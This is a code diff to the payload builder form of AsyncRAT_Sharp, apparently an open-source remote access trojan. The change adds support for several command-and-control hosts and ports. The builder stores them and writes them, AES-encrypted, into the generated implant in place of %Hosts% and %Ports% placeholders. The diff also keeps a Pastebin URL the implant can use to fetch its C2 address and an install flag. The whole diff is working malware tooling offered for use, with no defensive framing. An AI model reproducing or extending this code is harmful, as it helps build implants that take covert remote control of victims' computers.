@@ -7,6 +7,7 @@ using System.Text;
 using System.Security.Cryptography;
 using AsyncRAT_Sharp.Cryptography;
 using System.Security.Cryptography.X509Certificates;
+using System.Collections.Generic;
 
 namespace AsyncRAT_Sharp.Forms
 {
@@ -19,7 +20,7 @@ namespace AsyncRAT_Sharp.Forms
 
         private void button1_Click(object sender, EventArgs e)
         {
-            if (string.IsNullOrWhiteSpace(textIP.Text) || string.IsNullOrWhiteSpace(textPort.Text)) return;
+            if (listBoxIP.Items.Count == 0 || listBoxPort.Items.Count == 0) return;
 
             if (checkBox1.Checked)
             {
@@ -52,7 +53,7 @@ namespace AsyncRAT_Sharp.Forms
                         {
                             r.AsmDef.Write(saveFileDialog1.FileName);
                             MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                            Properties.Settings.Default.Save();
+                            SaveSettings();
                             r.AsmDef.Dispose();
                             this.Close();
                         }
@@ -63,6 +64,29 @@ namespace AsyncRAT_Sharp.Forms
             {
                 MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
+        }
+
+        private void SaveSettings()
+        {
+            try
+            {
+                List<string> Pstring = new List<string>();
+                foreach (string port in listBoxPort.Items)
+                {
+                    Pstring.Add(port);
+                }
+                Properties.Settings.Default.Ports = string.Join(",", Pstring);
+
+                List<string> IPstring = new List<string>();
+                foreach (string ip in listBoxIP.Items)
+                {
+                    IPstring.Add(ip);
+                }
+                Properties.Settings.Default.IP = string.Join(",", IPstring);
+
+                Properties.Settings.Default.Save();
+            }
+            catch { }
         }
 
         private void checkBox1_CheckedChanged(object sender, EventArgs e)
@@ -85,9 +109,32 @@ namespace AsyncRAT_Sharp.Forms
         {
             comboBoxFolder.SelectedIndex = 0;
             if (Properties.Settings.Default.IP.Length == 0)
-                textIP.Text = "127.0.0.1,127.0.0.1";
+                listBoxIP.Items.AddRange(new object[] { "127.0.0.1", "0.0.0.0" });
+
             if (Properties.Settings.Default.Pastebin.Length == 0)
                 txtPastebin.Text = "https://pastebin.com/raw/s14cUU5G";
+
+            try
+            {
+                string[] ports = Properties.Settings.Default.Ports.Split(new[] { "," }, StringSplitOptions.None);
+                foreach (string item in ports)
+                {
+                    if (!string.IsNullOrWhiteSpace(item))
+                        listBoxPort.Items.Add(item.Trim());
+                }
+            }
+            catch { }
+
+            try
+            {
+                string[] ip = Properties.Settings.Default.IP.Split(new[] { "," }, StringSplitOptions.None);
+                foreach (string item in ip)
+                {
+                    if (!string.IsNullOrWhiteSpace(item))
+                        listBoxIP.Items.Add(item.Trim());
+                }
+            }
+            catch { }
         }
 
         private void WriteSettings(AssemblyDefinition asmDef)
@@ -118,10 +165,38 @@ namespace AsyncRAT_Sharp.Forms
                                     string operand = methodDef.Body.Instructions[i].Operand.ToString();
 
                                     if (operand == "%Ports%")
-                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(textPort.Text);
+                                    {
+                                        if (chkPastebin.Enabled && chkPastebin.Checked)
+                                        {
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
+                                        }
+                                        else
+                                        {
+                                            List<string> LString = new List<string>();
+                                            foreach (string port in listBoxPort.Items)
+                                            {
+                                                LString.Add(port);
+                                            }
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
+                                        }
+                                    }
 
                                     if (operand == "%Hosts%")
-                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(textIP.Text);
+                                    {
+                                        if (chkPastebin.Enabled && chkPastebin.Checked)
+                                        {
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
+                                        }
+                                        else
+                                        {
+                                            List<string> LString = new List<string>();
+                                            foreach (string ip in listBoxIP.Items)
+                                            {
+                                                LString.Add(ip);
+                                            }
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
+                                        }
+                                    }
 
                                     if (operand == "%Install%")
                                         methodDef.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();
@@ -171,13 +246,73 @@ namespace AsyncRAT_Sharp.Forms
                 txtPastebin.Enabled = true;
                 textIP.Enabled = false;
                 textPort.Enabled = false;
+                listBoxIP.Enabled = false;
+                listBoxPort.Enabled = false;
+                btnAddIP.Enabled = false;
+                btnAddPort.Enabled = false;
+                btnRemoveIP.Enabled = false;
+                btnRemovePort.Enabled = false;
             }
             else
             {
                 txtPastebin.Enabled = false;
                 textIP.Enabled = true;
                 textPort.Enabled = true;
+                listBoxIP.Enabled = true;
+                listBoxPort.Enabled = true;
+                btnAddIP.Enabled = true;
+                btnAddPort.Enabled = true;
+                btnRemoveIP.Enabled = true;
+                btnRemovePort.Enabled = true;
             }
+        }
+
+        private void BtnRemovePort_Click(object sender, EventArgs e)
+        {
+            if (listBoxPort.SelectedItems.Count == 1)
+            {
+                listBoxPort.Items.Remove(listBoxPort.SelectedItem);
+            }
+        }
+
+        private void BtnAddPort_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                Convert.ToInt16(textPort.Text.Trim());
+                foreach (string item in listBoxPort.Items)
+                {
+                    if (item.Equals(textPort.Text.Trim()))
+                        return;
+                }
+                listBoxPort.Items.Add(textPort.Text.Trim());
+                textPort.Clear();
+            }
+            catch { }
+        }
+
+        private void BtnRemoveIP_Click(object sender, EventArgs e)
+        {
+            if (listBoxIP.SelectedItems.Count == 1)
+            {
+                listBoxIP.Items.Remove(listBoxIP.SelectedItem);
+            }
+        }
+
+        private void BtnAddIP_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                foreach (string item in listBoxIP.Items)
+                {
+                    textIP.Text = textIP.Text.Replace(" ", "");
+                    if (item.Equals(textIP.Text))
+                        return;
+                }
+                listBoxIP.Items.Add(textIP.Text.Replace(" ", ""));
+                textIP.Clear();
+            }
+            catch { }
         }
     }
 }
